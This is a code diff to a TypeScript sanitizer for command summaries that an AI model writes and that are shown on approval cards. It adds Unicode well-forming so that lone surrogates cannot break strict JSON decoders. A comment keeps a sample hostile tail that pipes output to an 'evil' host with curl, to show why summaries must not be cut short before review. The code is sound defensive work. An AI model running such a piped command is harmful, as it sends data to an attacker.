@@ -821,23 +821,36 @@ const OTHER_CONTROLS = /[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F-\u009F]/gu
  * `refusedReason()` / `groupRefusedReason()`) already gets sanitized text —
  * no client sanitizes it again, and none should have to.
  *
- * Three rules, in order: strip every Unicode `Cf` character (bidi/format/
+ * Four rules, in order: strip every Unicode `Cf` character (bidi/format/
  * zero-width controls — a hidden reorder or a hidden run of text); turn
  * every forced line break — `\r\n`, `\r`, `\n`, U+0085 (NEL), U+2028
  * (LINE SEPARATOR), U+2029 (PARAGRAPH SEPARATOR) — into a visible `⏎` and a
  * tab into `⇥` (real ones would hide everything after the first line from a
  * client that renders only that — including a client that honours `Zl`/
  * `Zp`/NEL as a break rather than just ASCII's two, re-review N1); replace
- * any other C0/C1 control with `�`.
+ * any other C0/C1 control with `�`; then, last, well-form the string
+ * (`String.prototype.toWellFormed()`, Node 20 / V8 11.0+ — Electron 44
+ * comfortably clears both): a path or command a model wrote can carry a
+ * lone UTF-16 surrogate (half an intended pair, or a bare
+ * U+D800–U+DFFF planted on purpose) that `JSON.stringify` happily encodes
+ * as an escape with no matching scalar value — Node's own `JSON.parse`
+ * shrugs it back in, but a strict decoder elsewhere (Swift's
+ * `JSONDecoder`, building a well-formed-UTF-16-only `String`) rejects the
+ * whole payload, not just the field, the instant it hits one. Run last so
+ * it sees the final text `capSummary()` will cut, not an intermediate one.
  *
  * Deliberately does *not* bound the length — that used to happen here (cut
  * at 300), which reopened the very hiding problem this function exists to
  * close: a command whose dangerous tail (`… | curl https://evil …`) fell
  * past the cut vanished from the card exactly as a raw `\n` would have
- * (re-review I1). Length is bounded once, centrally, by `capSummary()`.
+ * (re-review I1). Length is bounded once, centrally, by `capSummary()`,
+ * which is why well-forming runs before that cut, not after: `toWellFormed()`
+ * only ever replaces a lone surrogate with U+FFFD (never introduces one),
+ * so `capSummary()`'s surrogate-pair-aware boundary still sees a
+ * well-formed string to cut.
  *
  * A client outside this repo (exodus-ios) that renders its own copy of the
- * summary must apply the same three rules before display.
+ * summary must apply the same four rules before display.
  */
 export function sanitizeSummary(text: string): string {
   return text
@@ -845,6 +858,7 @@ export function sanitizeSummary(text: string): string {
     .replaceAll(LINE_BREAK, '⏎')
     .replaceAll('\t', '⇥')
     .replaceAll(OTHER_CONTROLS, '�')
+    .toWellFormed()
 }
 
 export interface CappedSummary {
